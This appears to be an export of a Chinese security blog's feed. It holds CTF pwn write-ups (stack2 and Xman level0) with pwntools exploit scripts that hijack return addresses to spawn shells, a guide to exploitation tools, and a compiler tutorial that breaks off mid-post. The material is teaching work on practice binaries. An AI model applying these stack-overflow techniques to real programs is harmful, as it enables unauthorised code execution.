class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>会发现这段脚本可以在本地打通，但是打远程却不行，查了一下是因为出题人忘记把 /bin/bash 配置到环境中，但是因为仍然能做就没有改，这样我们可以试一下能否用 system(“sh”) 来获取 shell，因为在 <code>/bin/bash</code> 中就有 <code>sh</code> 这个字段，且偏移为 7，那么我们仅仅需要上述 <code>write_v13(addr_offset+4, 0x80)</code> 为 <code>write_v13(addr_offset+4, 0x87)</code> 即可，果然这样便获得了 shell。</p><hr><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>, <span class="number">26883</span>)</span><br><span class="line"><span class="comment">#r = process(&quot;./stack2&quot;)</span></span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x08048980</span></span><br><span class="line">addr_offset = <span class="number">0x84</span></span><br><span class="line">call_system_addr = <span class="number">0x080485B4</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;How many numbers you have:\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Give me your numbers\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_v13</span>(<span class="params">offset, num</span>):</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;5. exit\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;which number to change:\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(offset))</span><br><span class="line">r.recvuntil(<span class="string">&quot;new number:\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="comment"># change the return address to the address of the system func</span></span><br><span class="line">write_v13(addr_offset, <span class="number">0xb4</span>)</span><br><span class="line">write_v13(addr_offset+<span class="number">1</span>, <span class="number">0x85</span>)</span><br><span class="line">write_v13(addr_offset+<span class="number">2</span>, <span class="number">0x04</span>)</span><br><span class="line">write_v13(addr_offset+<span class="number">3</span>, <span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write system func par</span></span><br><span class="line">write_v13(addr_offset+<span class="number">4</span>, <span class="number">0x87</span>)</span><br><span class="line">write_v13(addr_offset+<span class="number">5</span>, <span class="number">0x89</span>)</span><br><span class="line">write_v13(addr_offset+<span class="number">6</span>, <span class="number">0x04</span>)</span><br><span class="line">write_v13(addr_offset+<span class="number">7</span>, <span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>成功获得 shell 和 flag：</p><div align=center><img src="12.png" width=80%></div>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 底层技术 </tag>
            
            <tag> pwn </tag>
            
            <tag> ASLR </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Xman】level0------＜常用汇编指令、C 语言函数调用栈简介＞</title>
      <link href="/2021/10/19/pwn-level0/"/>
      <url>/2021/10/19/pwn-level0/</url>
      
        <content type="html"><![CDATA[<h1 id="知识点详解"><a href="#知识点详解" class="headerlink" title="知识点详解"></a>知识点详解</h1><h2 id="常用汇编指令"><a href="#常用汇编指令" class="headerlink" title="常用汇编指令"></a>常用汇编指令</h2><p>以 32 位汇编指令为例：</p><ul><li><strong><font color='red'>MOV DEST SRC</font>：将源操作数送入目标</strong><br>  MOV EAX,1111H             &emsp;&emsp; ;执行结果（EAX） = 1111H<br>  MOV EBX, EAX                 &emsp;&emsp;;将 EAX 中的值赋给EBX<br>  MOV EAX, [0x400596]      &emsp;&emsp;;[0x400596] 表示取地址内的值，将地址中的值赋给 EAX</li><li><strong><font color='red'>PUSH VALUE</font>：先将栈顶指针 SP-1，然后将 VALUE 压栈</strong><br>  PUSH 1111H            &emsp;&emsp;;将 1111H 压入栈顶<br>  PUSH EAX                &emsp;&emsp;;将 EAX 中的值压如栈顶</li><li><strong><font color='red'>POP DEST</font>：先将栈顶的值弹出至目的存储位置，然后 SP 指针 +1</strong><br>  POP EAX            &emsp;&emsp;;将栈顶的数据弹入 EAX</li><li><strong><font color='red'>LEA REG, SRC</font>：把源操作数的有效地址送给指定的寄存器</strong><br>  LEA EAX, [EBP-10H]                &emsp;&emsp; ; 把 EBP-10H 单元的 32 位地址送给 EAX</li><li><strong><font color='red'>CALL FUNC</font>：调用某个函数，相当于把CALL的下一条指令地址压栈和修改IP的值为被调函数的地址</strong><br>  CALL _PUTS            &emsp;&emsp;;程序跳转到 _PUTS 函数处执行</li><li><strong><font color='red'>LEAVE</font>：在函数返回时，恢复父函数栈帧的指令，等效于 MOV ESP, EBP;&emsp;POP EBP</strong></li><li><strong><font color='red'>RET</font>：在函数返回时，控制程序执行流返回父函数的指令，等效于 POP RIP（POP EIP 实际上是不存在这条指令的，EIP 的值不能由程序员显示的修改）</strong></li></ul><h2 id="C-语言函数调用栈"><a href="#C-语言函数调用栈" class="headerlink" title="C 语言函数调用栈"></a>C 语言函数调用栈</h2><ul><li><p><strong>函数调用栈</strong>是指在程序运行的时候内存中用于保存函数运行时状态的信息（如函数参数，局部变量等）的一段连续区域， 之所以称为栈是因为在发生函数调用时，被调函数（callee）的状态被压入栈顶，而调用者（caller）的状态被保存在了栈内。当函数调用结束时，被调函数（callee）的状态被弹出，栈顶恢复到调用者（caller）的状态。<font color='red'>函数的调用栈在内存中从高地址向低地址生长。</font></p></li><li><p>函数的状态主要受三个寄存器的影响 — <strong>EBP，ESP，EIP</strong>。其中 EBP 存放当前函数栈帧的基址，当前函数的局部变量可以通过 EBP 加偏移来索引，而EBP指向的存储单元中存放调用当前函数的的 caller 的 EBP。ESP 中存放当前函数栈帧的栈顶，在函数开始和结束的时候会发生变化。一般来说，当程序进入一个函数的时候，通常执行三条汇编指令：<strong>PUSH EBP;&emsp;MOV EBP ESP; &emsp;SUB ESP OFFSET</strong>，这三条汇编指令就是为了给函数开辟栈帧的。EIP 始终指向当前正在执行的指令，每次执行完一条指令，EIP 自动加一，指向下一条指令。</p></li><li><p>发生函数调用时，首先<strong>调用函数 caller</strong> 会将需要传递给被<strong>调函数 callee</strong> 的参数以<font color='red'><strong>逆序</strong></font>的方式压入栈中，然后将进行调用之后的下一条指令地址作为返回地址压入栈顶，最后call指令会改变EIP的值，使其指向被调函数的第一条指令（<strong>PUSH EBP</strong>）。被调函数 callee 执行 <strong>PUSH EBP;&emsp;MOV EBP ESP; &emsp;SUB ESP OFFSET</strong> 为自己开辟栈帧。这样栈结构如就如下：<br><img src="1.png"></p></li><li><p><strong><font color='red'>在 x86 汇编中，函数的调用使用栈来传递参数，参数逆序依次压入栈中，函数的返回值存放在 EAX 中；在 amd 汇编中，前 6 个参数按照逆序依次存放于 rdi、rsi、rdx、rcx、r8、r9 寄存器中，第七个以后的参数存放在栈中（也是逆序），返回值存放在 RAX 中</font></strong></p></li></ul><hr><h1 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h1><p>先用 <strong>file</strong> 查看文件的属性，可以看出 level0 是 <strong>64位 的 ELF 可执行文件</strong>：<br><img src="2.png"></p><p>再用 <strong>checksec</strong> 查看文件的保护机制，没有打开栈保护：</p><div align=center><img src="3.png" width=65%></div><p>将文件拖入 IDA-64bit 进行反汇编和反编译，可以得到 <strong>main</strong> 函数：<br><img src="4.png"></p><p>main 函数中并没有发现可以利用的漏洞，但是它调用了一个 <strong>vulnerable_function</strong> 函数，点进去看一下：</p><div align=center><img src="5.png" width=65%></div><p>可以看到 vulnerable_function 中有一个 read 函数，read 函数可以从 buf 所在栈的起始地址开始，写入 200h 个字节，又注意到 rbp 到 buf 的距离只有 80h 个字节，那么我们可以通过 read 函数读入数据，覆盖掉返回地址。通过观察 IDA 的函数窗口，发现有一个后门函数可以打开 shell：</p><div align=center><img src="6.png" width=65%></div><p>这样思路就很清晰了，查看 callsystem 函数的地址为 <strong>0x400596</strong>，我们只需要通过 read 函数修改返回地址为 <strong>0x400596</strong> ，便可以劫持函数的控制流，使程序执行 system 函数获得 shell。如图所示：<br><img src="7.png"></p><p>现在，我们构造 payload，先用 <strong>0x80</strong> 个来垃圾数据填充栈空间，由于是 64 位程序， rbp 占 8 个字节，故再用 <strong>0x8</strong> 个垃圾数据填充 rbp，最后用 <strong>0x400596</strong> 替换返回地址劫持控制流。故构造的 payload 为 <font color='red'>‘A’*0x80+’A’*0x8+0x400596 </font> 。由于 read 函数修改了返回地址，当 vulnerable_function 返回时，执行 <strong>ret</strong> 指令，会使得 <strong>rip</strong> 指向后门函数的地址，函数跳转到后门函数处执行。</p><hr><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exp.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">52000</span>)</span><br><span class="line"></span><br><span class="line">system_call = <span class="number">0x400596</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x80</span> + <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x8</span> + p64(system_call)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>运行脚本得到 flag</p><div align=center><img src="8.png" width=65%></div>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 底层技术 </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn 中常使用的工具</title>
      <link href="/2021/10/19/pwn-tools/"/>
      <url>/2021/10/19/pwn-tools/</url>
      
        <content type="html"><![CDATA[<h1 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h1><p>pwntools 是一个用 Python 编写的 CTF 框架和开发库，旨在快速构建原型和开发，并旨在使编写利用脚本尽可能简单。<br>通过以下命令用来安装 python3 下的 pwntools 包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get update</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> python3 -m pip --default-timeout=100 install --upgrade pip</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> python3 -m pip --default-timeout=100 install --upgrade pwntools</span></span><br></pre></td></tr></table></figure><p>以上命令执行完毕后进入 python3 输入 <code>from pwn import *</code>，如下图显示则安装成功。</p><div align=center><img src="1.png" width=80%></div><hr><h1 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h1><p>checksec 是一个脚本软件，在安装 pwntools 后被顺带安装，可以用来查看可执行文件的程序架构信息和保护信息。如下图使用：</p><div align=center><img src="2.png" width=65%></div><hr><h1 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h1><p>ROPgadget 这个工具允许你在二进制文件中搜索代码 gadget 片段，以方便 ROP 的利用。ROPgadget 支持 x86、x64、ARM、ARM64、PowerPC、SPARC 和 MIPS 架构上的 ELF/PE/Mach-O 格式。在安装 pwntools 后被顺带安装。以下是常用的 ROPgadget 指令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查找可存储寄存器的代码</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ROPgadget --binary rop --only <span class="string">&#x27;pop|ret&#x27;</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查找字符串</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ROPgadget --binary rop --string <span class="string">&quot;/bin/sh&quot;</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查找有int 0x80的地址</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ROPgadget --binary rop --only <span class="string">&#x27;int&#x27;</span></span></span><br></pre></td></tr></table></figure><hr><h1 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h1><p> one-gadget 是 glibc 里调用 execve(‘/bin/sh’, NULL, NULL) 的一段非常有用的 gadget。在我们能够控制 ip（也就是 pc）的时候，用 one-gadget 来做 RCE（远程代码执行）非常方便，比如有时候我们能够做一个任意函数执行，但是做不到控制第一个参数，这样就没办法调用 system(“sh”)，这个时候 one-gadget 就可以搞定了。如果你想知道 one-gadget 原理，<a href="https://david942j.blogspot.com/2017/02/project-one-gadget-in-glibc.html">click here！</a><br>通过以下命令安装 one_gadget：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 先安装ruby</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo add-apt-repository ppa:brightbox/ruby-ng</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get update</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get remove ruby</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install ruby2.6 ruby2.6-dev</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 再安装one_gadget</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo gem install one_gadget</span></span><br></pre></td></tr></table></figure><p> one-gadget 的使用非常简单，比如说希望在某个 libc 中找到某段启动 shell 的 gadget，只需键入以下命令：<code>$ one_gadget libc-2.23.so</code></p><p><img src="3.png"></p><p>可见输出结果不仅仅给出了 gadget 对应的 libc 偏移，还给出了约束，这样只需要控制程序在满足约束的前提下跳转到对应的地址执行 gadget 便可以获得 shell。</p><hr><h1 id="libc-database-search"><a href="#libc-database-search" class="headerlink" title="libc database search"></a>libc database search</h1><p>在进行 libc 基址泄露的时候，常常不知道远程服务器用的是什么版本的 libc，此时便可以通过 <a href="https://libc.blukat.me/">libc database search</a> 这个网站来查询所用的 libc 版本，只需要将泄露的函数名和泄露的函数绝对地址或绝对地址的后 12 位填入表单中，点击查找则可以找到可能的 libc 版本。其原理是由于内存分配是以页为单位，而一个页是 4K 个字节，也就是需要用 12 位二进制来存储，所以 libc 在加载到内存中，低 12 位地址是固定不变的。<br>如下所示：</p><div align=center><img src="4.png" width=65%></div><p>找到的 libc 有：</p><div align=center><img src="5.png" width=65%></div><p>同时会提供下载接口和一些常用函数的偏移：</p><div align=center><img src="6.png" width=75%></div><hr><h1 id="GDB-pwndbg"><a href="#GDB-pwndbg" class="headerlink" title="GDB+pwndbg"></a>GDB+pwndbg</h1><p>GDB 全称“GNU symbolic debugger”，从名称上不难看出，它诞生于 GNU 计划，是 Linux 下常用的程序调试器。发展至今，GDB 已经迭代了诸多个版本，当下的 GDB 支持调试多种编程语言编写的程序，包括 C、C++、Go、Objective-C、OpenCL、Ada 等。实际场景中，GDB 更常用来调试 C 和 C++ 程序。而 pwndbg (/poʊndbæg/) 是一个 GDB 插件，它使得用GDB进行调试变得不那么麻烦，且更加专注于底层软件开发人员、硬件黑客、反向工程师和开发人员所需的特性。而 pwndbg 是 GDB 上的一种插件，可以使得调试功能更强大。</p><p>GDB 一般在安装 C/C++ 编译套件的时候会被自动安装到系统中，在没有给它装插件的情况下，GDB的运行如下：<br><img src="7.png"></p><p>可以使用如下命令安装 pwndbg 插件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> pwndbg</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./setup.sh</span></span><br></pre></td></tr></table></figure><p>在安装好 pwndbg 后，打开 GDB 如下：<br><img src="8.png"></p><p><strong>gdb+pwndbg 的常用基本指令：</strong></p><ul><li><p><code>r</code> ：开始运行程序</p></li><li><p><code>b [funcname/*addr]</code> ：在某个函数起始处或某个指令地址处下断点</p></li><li><p><code>c</code> ：继续执行程序</p></li><li><p><code>ni</code> ：单步步过</p></li><li><p><code>s</code> ：单步步入</p></li><li><p><code>stop</code> ：停止执行</p></li><li><p><code>q</code> ：退出gdb</p></li><li><p><code>stack [num]</code> ：查看栈帧</p></li><li><p><code>info b</code> ：查看断点详细信息</p></li><li><p><code>delete</code>：删除所有断点</p></li><li><p><code>delete  [break point num]</code> : 根据断点号删除指定的断点，用空格隔开可以删除多个断点</p></li><li><p><code>vmmap</code> ：查看程序内存结构</p></li><li><p><code>aslr on/off</code> ：打开/关闭 aslr</p></li><li><p><code>got</code> ：查看 got 表信息</p></li><li><p><code>plt</code> ：查看 plt 表信息</p></li><li><p><code>x/[n/f/u]  [addr]</code> ：查看任意内存位置的值<br>  <strong>n</strong>：是正整数，表示需要显示的内存单元的个数，即从当前地址向后显示 n 个内存单元的内容，一个内存单元的大小由第三个参数u定义。</p><p>  <strong>f</strong>：表示 addr 指向的内存内容的输出格式，s 对应输出字符串，此处需特别注意输出整型数据的格式：<br>  <br>x 按十六进制格式显示变量。<br>d 按十进制格式显示变量。<br>u 按十进制格式显示无符号整型。<br>o 按八进制格式显示变量。<br>t 按二进制格式显示变量。<br>a 按十六进制格式显示变量。<br>c 按字符格式显示变量。<br>f 按浮点数格式显示变量。<br></p><p>  <strong>u</strong>：就是指以多少个字节作为一个内存单元 unit，默认为 4。u 还可以用被一些字符表示：<br>如 b=1 byte, h=2 bytes,w=4 bytes,g=8 bytes.</p><p>  <strong>addr</strong>：表示内存地址。</p><p>  演示如：x/22dw 0x0804A220</p></li></ul><hr><blockquote><p>参考资料：《CTF 竞赛入门指南》、<a href="https://ctf-wiki.org/">CTF Wiki</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> GDB </tag>
            
            <tag> pwntools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编译过程发生了什么？</title>
      <link href="/2021/10/18/underlyingPrinciple-compile-nested/"/>
      <url>/2021/10/18/underlyingPrinciple-compile-nested/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我们平时用 C 语言写的代码是一种语法层面接近人思维的代码，而计算机所执行的代码是机器层面的二进制代码，那么要想让我们编写的 C 语言代码在机器上运行起来，那这中间必然有一个转换过程，这个过程的最主要部分就是编译。我们在这篇文章中主要关注在编译过程中发生了什么（而不是怎么发生），通过 Clang/LLVM 观察一段代码在各个编译阶段的输出，对编译流程进行一个大致的分析。假设以下是我们的源代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addTwo</span><span class="params">(<span class="keyword">int</span> first, <span class="keyword">int</span> second)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> result = first + second;</span><br><span class="line"><span class="keyword">return</span> <span class="number">10</span>; <span class="comment">// return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="词法分析"><a href="#词法分析" class="headerlink" title="词法分析"></a>词法分析</h1><p>对于我们输入的源代码，编译器（在词法分析阶段称为<strong>扫描器 Scaner</strong> ）首先进行的是词法分析。所谓词法分析，就是对输入的源代码一个一个字符的扫描，运用一种类似于<strong>有限状态机</strong>的算法，将源代码的字符序列分割为一系列的<strong>记号（Token）</strong>，Token 的类型一般有关键字、标识符、字面常量和特殊符号（如加号、等号）等。在识别 Token 的同时，扫描器还会完成其它的一些工作。比如删除诸如注释、空格和制表符之类的字符，将标识符存放到符号表，将数字、字符串常量存放到文字表等，以备后面的步骤使用。</p><p>我们通过 Clang 编译前端，可以查看上述 C 代码的词法分析生成的 Token，如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> clang -fsyntax-only -Xclang -dump-tokens addTwo.c</span></span><br></pre></td></tr></table></figure><p><img src="1.png"></p><p>可见，进行词法分析后生成 Token，还会包含每个 Token 的一些位置信息。</p><hr><h1 id="语法分析"><a href="#语法分析" class="headerlink" title="语法分析"></a>语法分析</h1><p>在生成 Token 以后，接下来就是语法分析，语法分析通过<strong>语法分析器（Parser）</strong> 完成。Parser 采用<strong>上下文无关文法</strong>的分析手段，生成一个体现语法规则的数据结构，<strong>抽象语法树 AST</strong> ，而 AST 的具体形状与高级语言的文法定义有关。</p><p>我们通过 Clang 编译前端，可以查看上述 C 代码的词法分析生成的 AST，如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> clang -fsyntax-only -Xclang -ast-dump addTwo.c</span></span><br></pre></td></tr></table></figure><p><img src="2.png"></p><p>其中，我们可以看到 AST 的根是一个称为 <strong>TranslationUnitDecl</strong> 的节点，这个节点代表的就是我们的 <code>.c</code> 文件。根节点有很多 <strong>TypedefDecl</strong> 的子节点，这是编译器给我们自动生成的一些节点，暂时不必考虑，我们重点看 <strong>FunctionDecl</strong> 这个子节点，这个节点代表的就是我们的 c 代码中定义的函数，可以看到后面显示了函数名，返回类型，形参类型等函数的属性。而 <strong>FunctionDecl</strong> 节点又有很多子节点，其中 <strong>DeclStmt</strong> 节点代表变量声明语句，<strong>ReturnStmt</strong> 节点代表返回语句。依次递归，AST 可以完美的表示出我们写的代码，并且每个树节点都会包含详细的代码中所体现出来的属性。</p><hr><h1 id="语义分析"><a href="#语义分析" class="headerlink" title="语义分析"></a>语义分析</h1><p>语法分析仅仅对源代码进行了语法层面的分析，但此时语句的真正意义还没有被解析。比如说 C 语言里面两个指针做乘法运算时没有意义的，但是这个语句在语法上是合理的，这时候就需要语义分析了，语义分析通过<strong>语义分析器（Semantic Analyzer）</strong> 完成。语义分析阶段主要是确保代码是否违反编程语言的类型系统，并将相关信息存入符号表。比如将一个浮点型赋值给一个指针的时候，语义分析器就会发现这个类型不匹配，编译器就会报错。而将 0 作为除数是能通过语义分析的，只有在运行的时候才会报错。<em>现在有很多静态分析工具，利用通过分析程序的控制流信息，在运行前就识别出这种运行时错误。</em></p><p><em><strong>clang 的语义分析已经夹杂于语法分析中，上述生成的AST其实就是夹杂了语义分析的 AST。</strong></em></p><hr><h1 id="中间代码生成与优化"><a href="#中间代码生成与优化" class="headerlink" title="中间代码生成与优化"></a>中间代码生成与优化</h1><p>现代的编译器会有很多层次的优化，往往源码级别会有一个优化过程，比如上述例子中的 <strong>int result = first + second;</strong> 这个语句，由于函数返回的是一个常量，这句代码是完全不必要存在的。但是在语法树层面的优化不是很好实现，所以往往把源代码转换成<strong>中间代码（IR）</strong> 后进行优化。IR 其实已经非常接近目标代码了，但是跟目标代码的最大区别是 <strong>IR 和目标及其和运行时的环境无关</strong>。比较常见 IR 有三地址码（LLVM IR 所采用的形式）和 P-代码。</p><p>我们可以查看上述 C 代码的生成的 LLVM IR，如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> -O0代表不执行任何优化</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> clang addTwo.c -emit-llvm -O0 -S -c -o addTwo.ll &amp;&amp; cat addTwo.ll</span> </span><br></pre></td></tr></table></figure><div align=center><img src="3.png" width=65%></div><p>可以看到在没有执行任何优化的情况下， <strong>int result = first + second;</strong> 这个语句也被翻译成了 IR，我们再看执行优化的情况下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> -O1代表执行一级优化，其中就包含死代码消除</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> clang addTwo.c -emit-llvm -O0 -S -c -o addTwo.ll &amp;&amp; cat addTwo.ll</span> </span><br></pre></td></tr></table></figure><div align=center><img src="4.png" width=85%></div><p>可以看到整个函数体仅仅剩下了一条语句。其实在 LLVM 内部也是首先生成了没有执行优化的 IR，然后通过一个个 pass （也是优化程序），将未优化的 IR 转换为优化过后的IR。</p><p><strong>中间代码使得编译器可以分为前端和后端。编译器前端负责产生机器无关的中间代码，编译器后端将中间代码转换成目标机器代码。对于一些可以跨平台的编译器而言，他们可以针对不同的平台使用同一个前端和针对不同及其平台的数个后端。而我们可以把 IR 优化成 IR 的过程看为中端。</strong> 比如 LLVM 编译器架构就采用了这种思想，如下图：<br><img src="5.png"></p><hr><h1 id="目标代码生成"><a href="#目标代码生成" class="headerlink" title="目标代码生成"></a>目标代码生成</h1><p>要在指定的机器上执行，还需要将 IR 转换为二进制目标代码。我们通过以下指令直接看上面优化过后的 IR 所生成的目标文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// llc是LLVM提供的目标代码生成器，file是Linux查看文件属性的命令</span><br><span class="line"><span class="meta">$</span><span class="bash"> llc addTwo.ll -filetype=obj -o addTwo.o &amp;&amp; file addTwo.o &amp;&amp; objdump -s -d addTwo.o</span></span><br></pre></td></tr></table></figure><p><img src="6.png"></p><p>可以看到我们生成的是 64 位的 ELF 可重定位文件，而汇编代码也就仅仅两行，一个是把返回值存入 eax 寄存器，一个是返回指令。</p><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>从最直观的角度来讲，编译器就是将高级语言翻译为机器语言的一个工具。一般的编译流程如下图：<br><img src="7.png"></p><hr><p><strong>参考资料</strong>：《程序员的自我修养》、Clang 官方文档、LLVM 官方文档</p>]]></content>
      
      
      <categories>
          
          <category> 底层原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 链接 </tag>
            
            <tag> clang </tag>
            
            <tag> 编译 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编译链接简介</title>
      <link href="/2021/10/18/underlyingPrinciple-compile-and-link/"/>
      <url>/2021/10/18/underlyingPrinciple-compile-and-link/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我们都知道，机器上运行的程序都是二进制程序，但是我们编写的 C 语言代码却是由一个个字符加上某些规则“装配”而成的文本文件，这些文本文件是怎么样转换为二进制程序的呢？这里面可有大奥秘！从 C 源码文件到二进制文件，大概经历了以下几个过程：<br><img src="1.png"></p><p>下面通过一个例子来分析，这是写好的三个源码文件，三个源码文件均放在用一个目录下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mainFunc.c</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span 